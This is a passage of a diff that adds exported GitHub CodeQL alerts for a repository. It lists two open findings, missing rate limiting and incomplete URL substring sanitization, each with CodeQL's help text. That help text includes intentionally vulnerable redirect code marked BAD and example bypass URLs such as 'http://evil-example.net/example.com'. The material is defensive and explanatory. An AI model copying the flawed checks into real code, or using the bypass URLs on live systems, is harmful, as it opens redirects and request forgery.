+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/2",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/2",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/missing-rate-limiting",
+      "severity": "warning",
+      "description": "Missing rate limiting",
+      "name": "js/missing-rate-limiting",
+      "tags": ["external/cwe/cwe-307", "external/cwe/cwe-400", "external/cwe/cwe-770", "security"],
+      "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
+      "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This route handler performs a file system access, but is not rate-limited."
+      },
+      "location": {
+        "path": "src/webui-server.js",
+        "start_line": 148,
+        "end_line": 151,
+        "start_column": 14,
+        "end_column": 2
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/2/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 1,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/1",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/1",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/incomplete-url-substring-sanitization",
+      "severity": "warning",
+      "description": "Incomplete URL substring sanitization",
+      "name": "js/incomplete-url-substring-sanitization",
+      "tags": ["correctness", "external/cwe/cwe-020", "security"],
+      "full_description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
+      "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "'ghcr.io' may be followed by an arbitrary host name."
+      },
+      "location": {
+        "path": "test/docker-security.test.js",
+        "start_line": 729,
+        "end_line": 729,
+        "start_column": 39,
+        "end_column": 66
+      },
+      "classifications": ["test"]
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/1/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  }
+]
